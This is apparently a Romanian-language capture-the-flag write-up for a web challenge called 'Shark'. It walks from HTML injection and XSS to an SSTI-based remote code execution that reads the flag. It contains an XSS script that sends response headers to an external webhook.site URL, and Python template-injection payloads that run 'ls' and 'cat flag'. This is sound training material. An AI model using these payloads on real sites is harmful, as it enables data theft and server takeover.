
# Write-up: Shark 

<img width="761" height="226" alt="image" src="https://github.com/user-attachments/assets/650418d4-1bd5-41bb-8710-c83342347e40" />


![Author](https://img.shields.io/badge/Author-Betaflash-red?style=for-the-badge)

![Category](https://img.shields.io/badge/Category-Web%20Exploitation-orange?style=for-the-badge&logo=kalilinux)

![Difficulty](https://img.shields.io/badge/Difficulty-Easy--Medium-yellow?style=for-the-badge)

![Points](https://img.shields.io/badge/Points-500-success?style=for-the-badge)

![Status](https://img.shields.io/badge/Status-SOLVED-brightgreen?style=for-the-badge)          

## Rezolvare :

<img width="330" height="137" alt="image" src="https://github.com/user-attachments/assets/5af995d8-3851-4f0b-a217-fe5ee4bcf63e" />


### Initial, am testat modul în care aplicatia gestioneaza input-ul utilizatorului
#### Am observat ca serverul nu sanitazeaza datele introduse, permitand injectarea de tag-uri Html

```html
<h1>test</h1>
```

### Rezultat: Textul a fost randat ca header H1, confirmand vulnerabilitatea de Html Injection

<img width="275" height="266" alt="image" src="https://github.com/user-attachments/assets/b44f987a-ca3a-48a7-a3c0-9f992a5b8111" />


# Confirmarea XSS
### Avand confirmarea injectarii HTML, am escaladat testele catre executia de cod JavaScript pentru a verifica existenta unei vulnerabilitati XSS.


```html
<script>alert(1)</script>
```

### Scriptul a fost executat cu succes de catre browser

<img width="1662" height="681" alt="image" src="https://github.com/user-attachments/assets/7227ece4-0ec9-4e90-93da-776583e79714" />


## Enumerare si Tentative de Exploatare (Dead ends)

Am încercat diverse metode standard de exfiltrare prin XSS, însa fara succes initial:

```
LocalStorage / SessionStorage: ({})

Cookies: Nu existau

DOM Scraping: Html-ul paginii nu continea informatii sensibile

Fisiere ascunse: Accesarea directa a /flag sau /flag.txt a returnat 404

```


## Deoarece atacurile Client-Side nu au oferit rezultate, am decis sa folosesc XSS-ul pentru a face reconnaissance asupra serverului. 

#### Am injectat un script pentru a intercepta si exfiltra Header-ele HTTP de raspuns catre un webhook extern.

```html
#script complet

<script>
fetch('/').then(r => {
    let h = '';
    r.headers.forEach((v, k) => h += k + ':' + v + ';');
    fetch('https://webhook.site/cf54da3f-5764-4b8d-86bd-68166597c238?app=' + btoa(h));
})
</script>
```


```html
# 1 Liner

<script>fetch('/').then(r=>{let h='';r.headers.forEach((v,k)=>h+=k+':'+v+';');fetch('https://webhook.site/cf54da3f-5764-4b8d-86bd-68166597c238?app='+btoa(h))})</script>
```

### Rezultat: Raspunsul decodat a dezvaluit :

```py
# Server:
Werkzeug/2.0.3
Python/3.6.9

```

<img width="1537" height="643" alt="image" src="https://github.com/user-attachments/assets/851ce1b7-4580-4c75-af31-a6275a3252f6" />

# Identificarea SSTI

### Informatia ca serverul ruleaza Python a schimbat vectorul de atac. Am banuit că input-ul reflectat nu este doar afisat asa ca am testat SSTI :

```py
${7*7}
```

### Serverul a returnat 49. Faptul ca operatia matematica a fost calculata pe server confirma vulnerabilitatea SSTI.

<img width="328" height="132" alt="image" src="https://github.com/user-attachments/assets/9f50dc1c-09b9-433c-9fcc-14a8c9abaa77" />


# RCE

### Avand executie de cod prin SSTI, am importat modulul `os` din Python pentru a interactiona cu sistemul de operare (Remote Code Execution)

```py
${__import__('os').popen('ls').read()}
```

### Am identificat fisierul `flag` în directorul curent.

<img width="345" height="161" alt="image" src="https://github.com/user-attachments/assets/4da4da79-734d-42e0-a38e-8b4eacf2cd55" />


# Flag 

```py
${__import__('os').popen('cat flag').read()}
```

<img width="1146" height="188" alt="image" src="https://github.com/user-attachments/assets/eb32546b-acc3-4dc8-8d55-1e8d7c4105a8" />









